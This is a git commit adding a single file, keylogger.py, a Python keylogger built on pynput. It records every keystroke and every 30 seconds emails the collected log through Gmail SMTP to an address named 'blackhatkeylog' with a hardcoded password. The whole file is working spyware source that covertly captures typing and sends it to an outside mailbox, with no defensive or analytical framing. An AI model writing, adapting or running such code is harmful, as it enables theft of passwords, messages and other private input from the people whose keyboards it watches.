907a7fbf22b0a63a154c2f1052eafcb3ebee4759
Healme-2114 <Hilmi.enginar123@gmail.com>
2021-12-24 23:18:38 +0300

    +

---
+++ keylogger.py
@@ -0,0 +1,42 @@
+import smtplib
+import threading
+import pynput
+
+log = ""
+
+def callback_function(key):
+    global log
+    try:
+        log = log + key.char.encode("utf-8")
+        #log = log + str(key)
+        print(log)
+    except TypeError:
+        log = log + str(key)
+    except AttributeError:
+        if key == key.space:
+            log = log + " "
+        else:
+            log = log + str(key)
+    print(log)
+
+def send_email(mail_address,password,message):
+    email_server = smtplib.SMTP("smtp.gmail.com",587)
+    email_server.starttls()
+    email_server.login(mail_address,password)
+    email_server.sendmail(mail_address,mail_address,message)
+    email_server.quit()
+
+#thread - threading
+
+def thread_func():
+    global log
+    send_email("blackhatkeylog@gmail.com", "keylogger123", log)
+    log = ""
+    timer_object = threading.Timer(30,thread_func)
+    timer_object.start()
+
+keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)
+with keylogger_listener:
+    thread_func()
+    keylogger_listener.join()
+
